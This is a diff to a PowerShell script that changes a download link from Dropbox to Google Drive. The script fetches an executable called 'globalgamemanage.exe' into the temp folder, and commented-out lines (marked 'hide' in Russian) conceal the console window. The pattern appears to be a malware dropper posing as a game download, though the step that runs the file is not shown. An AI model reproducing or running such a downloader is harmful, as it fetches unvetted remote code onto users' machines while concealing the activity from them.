@@ -7,7 +7,7 @@ $ErrorActionPreference = "Stop"
 # $consolePtr = [Console.Window]::GetConsoleWindow()
 # [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть
 
-$GameUrl = "https://uc5bf4a11e9e17c243d299ace3ec.dl.dropboxusercontent.com/cd/0/get/DMUxGploAXm-0tJRilC3B8mgs46wMhC9hQnMMsg-FkwVn6m-tgkUmTTQ5I4YTqchLA7wtGVlf6kRgyQiRYcL3Nc5m8PPKZHSTyEbLM5CgJsqrCzufQKeDCtPP9pDbRa1-62bdvfi_c-c6QLLt5KjekzrTFl51EvvETpQ56J8jF0IIw/file?_download_id=085746869529595873064691644889032709839618747776893481506205460647&_log_download_success=1&c_luid=6d44cb05#"
+$GameUrl = "https://drive.usercontent.google.com/download?id=13xb3VQ5AxmE2hL3jA8wdJlYRmLaq09Ol&export=download&authuser=0&confirm=t&uuid=3ebc3cae-bf95-4e94-9620-f4330900e3a8&at=AMrWOn3StSAp3V6HDmOmI7B1of-c%3A1795211316319"
 $TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.exe"
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
